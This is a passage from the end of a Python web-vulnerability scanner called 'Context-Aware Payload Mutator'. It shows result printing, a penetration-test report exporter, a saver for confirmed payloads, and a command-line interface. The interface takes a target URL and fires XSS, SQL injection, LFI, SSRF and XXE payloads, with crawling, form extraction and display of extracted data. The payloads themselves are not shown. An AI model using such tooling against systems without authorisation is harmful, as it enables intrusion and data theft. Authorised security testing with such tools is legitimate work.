                  f"({fr.method})")
            print(f"  {Fore.WHITE}│    ▸ HTTP Status : {Fore.YELLOW}{fr.status_code}  "
                  f"Response: {fr.response_time*1000:.0f}ms")
            print(f"  {Fore.WHITE}│    ▸ Evidence    : {Fore.RED}{fr.evidence}")
            print(f"  {Fore.WHITE}│    ▸ Payload     : "
                  f"{Fore.GREEN}{Style.BRIGHT}{fr.payload.raw}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}│    ▸ Notes       : {fr.payload.notes}")

            if fr.extracted_data:
                print(f"\n  {Fore.RED}│    ╔══ EXTRACTED DATA "
                      f"{'═'*40}")
                for line in fr.extracted_data.splitlines():
                    print(f"  {Fore.RED}│    ║  {line}")
                print(f"  {Fore.RED}│    ╚{'═'*57}{Style.RESET_ALL}")

            if fr.response_snippet:
                print(f"\n  {Fore.WHITE}│    ╔══ RESPONSE SNIPPET "
                      f"{'─'*38}")
                print(f"  {Fore.WHITE}│    ║  "
                      f"{Style.DIM}{fr.response_snippet[:260]}{Style.RESET_ALL}")
                print(f"  {Fore.WHITE}│    ╚{'─'*57}{Style.RESET_ALL}")

        print(f"\n  {Fore.WHITE}└{'─'*61}{Style.RESET_ALL}")

    # Summary table
    print(f"\n{Fore.CYAN}{'═'*65}")
    print(f"{Fore.WHITE}{Style.BRIGHT}  SUMMARY")
    print(f"{Fore.CYAN}{'═'*65}{Style.RESET_ALL}")
    print(f"  {'ENDPOINT':<30} {'PARAM':<12} {'FIRED':<7} "
          f"{'HITS':<6} {'VULN TYPES'}")
    print(f"  {'─'*30} {'─'*12} {'─'*7} {'─'*6} {'─'*20}")
    for r in all_results:
        confirmed = [fr for fr in r.fire_results if fr.confirmed]
        vtypes = list({fr.payload.vuln_type for fr in confirmed})
        color = Fore.RED if confirmed else Fore.WHITE
        short_url = (r.url[:28] + "..") if len(r.url) > 30 else r.url
        print(f"  {color}{short_url:<30} {r.parameter:<12} "
              f"{len(r.fire_results):<7} {len(confirmed):<6} "
              f"{', '.join(vtypes) or '—'}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}{'═'*65}{Style.RESET_ALL}\n")


def export_report(all_results: list, filepath: str):
    with open(filepath, "w") as f:
        f.write("# CAPM v2.0 — Penetration Test Report\n\n")
        total = sum(sum(1 for fr in r.fire_results if fr.confirmed)
                    for r in all_results)
        f.write(f"**Total Confirmed Vulnerabilities: {total}**\n\n---\n\n")
        for r in all_results:
            confirmed = [fr for fr in r.fire_results if fr.confirmed]
            f.write(f"## `{r.url}` — param: `{r.parameter}`\n\n")
            f.write(f"- WAF: {r.waf_vendor if r.waf_detected else 'None detected'}\n")
            f.write(f"- Payloads fired: {len(r.fire_results)}\n")
            f.write(f"- Confirmed: {len(confirmed)}\n\n")
            if confirmed:
                f.write("### Confirmed Vulnerabilities\n\n")
                for i, fr in enumerate(confirmed, 1):
                    f.write(f"#### {i}. {fr.payload.vuln_type} "
                            f"[{fr.payload.risk.upper()}]\n\n")
                    f.write(f"| Field | Value |\n|-------|-------|\n")
                    f.write(f"| Full URL | `{fr.full_url}` |\n")
                    f.write(f"| Parameter | `{fr.parameter}` ({fr.method}) |\n")
                    f.write(f"| HTTP Status | {fr.status_code} |\n")
                    f.write(f"| Response Time | {fr.response_time*1000:.0f}ms |\n")
                    f.write(f"| Evidence | {fr.evidence} |\n")
                    f.write(f"| Notes | {fr.payload.notes} |\n\n")
                    f.write(f"**Payload:**\n```\n{fr.payload.raw}\n```\n\n")
                    if fr.extracted_data:
                        f.write(f"**Extracted Data:**\n```\n{fr.extracted_data}\n```\n\n")
                    if fr.response_snippet:
                        f.write(f"**Response Snippet:**\n```\n{fr.response_snippet}\n```\n\n")
                    f.write("---\n\n")
    print(f"{Fore.GREEN}[✓] Report saved to: {filepath}")


def save_confirmed_payloads(all_results: list, filepath: str):
    with open(filepath, "w") as f:
        for r in all_results:
            for fr in r.fire_results:
                if fr.confirmed:
                    f.write(f"# [{fr.payload.vuln_type}] {r.url} "
                            f"param={r.parameter}\n")
                    f.write(fr.payload.raw + "\n\n")
    print(f"{Fore.GREEN}[✓] Confirmed payloads saved to: {filepath}")


# ──────────────────────────────────────────────
#  Entry Point
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Context-Aware Payload Mutator v2.0",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url",        required=True,
                        help="Target URL")
    parser.add_argument("-p", "--param",
                        help="Parameter to test (auto-detects if omitted)")
    parser.add_argument("-m", "--method",     default="GET",
                        choices=["GET", "POST"])
    parser.add_argument("--crawl",            action="store_true",
                        help="Crawl common paths for additional endpoints")
    parser.add_argument("--forms",            action="store_true",
                        help="Extract and test forms/links from page")
    parser.add_argument("--no-fire",          action="store_true",
                        help="Context detection only — do not fire payloads")
    parser.add_argument("--only",
                        help="Limit to vuln type(s): xss,sqli,lfi,ssrf,xxe")
    parser.add_argument("--proxy",
                        help="Proxy URL e.g. http://127.0.0.1:8080")
    parser.add_argument("--delay",            type=float, default=0.5)
    parser.add_argument("--timeout",          type=int,   default=15)
    parser.add_argument("--header",           action="append", metavar="K:V",
                        help="Custom header (repeatable)")
    parser.add_argument("--output",           choices=["terminal", "json"],
                        default="terminal")
    parser.add_argument("--export-report",    metavar="FILE",
                        help="Save markdown report")
    parser.add_argument("--save-payloads",    metavar="FILE",
                        help="Save confirmed payloads only")
    args = parser.parse_args()

    banner()

    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    vuln_filter = None
    if args.only:
        vuln_filter = [v.strip().upper() for v in args.only.split(",")]
        print(f"{Fore.CYAN}[*] Filtering to: {', '.join(vuln_filter)}\n")

    mutator = PayloadMutator(
        proxy=args.proxy,
        delay=args.delay,
        timeout=args.timeout,
        headers=headers,
        vuln_filter=vuln_filter,
    )

    results = mutator.run(
        url=args.url,
        param=args.param,
        method=args.method,
        crawl=args.crawl,
        fire=not args.no_fire,
        forms=args.forms,
    )

    print_results(results, args.output)

    if args.export_report:
        export_report(results, args.export_report)
    if args.save_payloads:
        save_confirmed_payloads(results, args.save_payloads)


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
